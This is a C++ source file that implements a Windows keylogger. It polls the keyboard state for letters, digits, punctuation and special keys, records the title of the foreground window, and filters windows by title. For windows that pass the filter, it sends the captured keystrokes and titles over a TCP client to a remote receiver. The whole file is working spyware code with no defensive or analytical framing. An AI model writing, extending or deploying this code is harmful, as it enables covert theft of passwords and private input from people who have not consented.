#pragma once
#include "Keylogger.h"

const std::vector<int> Keylogger::valueKeys = {
	0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, //numbers from 0 to 9
	VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9, // Numpad numbers from 0 to 9
	0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, // Alphabet from a to z
	VK_OEM_1, VK_OEM_PLUS, VK_OEM_COMMA, VK_OEM_MINUS, VK_OEM_PERIOD, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7, VK_OEM_8,  VK_SPACE // Keyboard specific keys
};
const std::vector<int> Keylogger::specialKeys = {VK_LBUTTON, VK_BACK, VK_TAB, VK_RETURN, VK_RSHIFT, VK_LSHIFT, VK_LCONTROL,VK_RCONTROL, 
												 VK_LMENU, VK_RMENU, VK_CAPITAL, VK_ESCAPE, VK_DELETE, VK_LEFT, VK_UP, VK_RIGHT, VK_DOWN }; //Special Keys
const std::vector<int> Keylogger::numpadKeys = { VK_MULTIPLY, VK_ADD, VK_SEPARATOR, VK_SUBTRACT, VK_DECIMAL, VK_DIVIDE }; //Numpad special keys
const std::vector<std::vector<int>> Keylogger::trackedKeys = { valueKeys, specialKeys, numpadKeys };

const std::vector<std::wstring> Keylogger::specialKeysNames = { L"{LMB}", L"{BSPC}", L"{TAB}",L"{ENTER}",L"{RSHIFT}", L"{LSHIFT}",L"{LCTRL}",
																L"{RCTRL}",L"{LALT}",L"{RALT}",L"{CAPS}",L"{ESC}",L"{DEL}",L"{LEFT}",L"{UP}",
																L"{RIGHT}",L"{DOWN}" };

Keylogger::Keylogger(TcpClient* client, Filter* filter) {
	this->filter = filter;
	this->client = client;
}

Keylogger::~Keylogger() {
	delete this->filter;
}


void Keylogger::logKeys() {
	HWND hWindow = GetForegroundWindow();
	BYTE states[256];
	if (!GetKeyboardState(states))
		return;
	HKL lang = GetKeyboardLayout(GetWindowThreadProcessId(hWindow, NULL));	
	bool isWorthy = false;
	for (unsigned int i = 0; i < trackedKeys.size(); i++) {
		for (unsigned int j = 0; j < trackedKeys[i].size(); j++) {
			if (GetAsyncKeyState(trackedKeys[i][j]) & 0x0001) { // key was pressed										
				if (hWindow != hLastTrackedWindow || titleUpdateRequest) {
					wchar_t windowTitle[255];
					GetWindowTextW(hWindow, windowTitle, 255);
					if (std::wstring(windowTitle) != this->windowTitle) {
						if (filter->Check(std::wstring(windowTitle))) {
							isWorthy = true;
							client->Send(L"\n[" + this->windowTitle + L"]\n\t");
						}
							
						else
							isWorthy = false;
						this->windowTitle = std::wstring(windowTitle);
					}
					titleUpdateRequest = false;
					hLastTrackedWindow = hWindow;
				}			

				UINT scanCode = MapVirtualKeyEx(trackedKeys[i][j], MAPVK_VK_TO_CHAR, lang);

				switch (i) //key group
				{
				
				case 0: //valueKeys
				case 2:
					wchar_t wcharBuf[2];
					ToUnicodeEx(trackedKeys[i][j], scanCode, states, wcharBuf, 2, 0, lang);
					if (isWorthy)
						client->Send(wcharBuf[0]);
					break;
				case 1:
					if (isWorthy)
						client->Send(this->specialKeysNames[j]);
					titleUpdateRequest = true;
					break;
				}

			}
		}
	}
}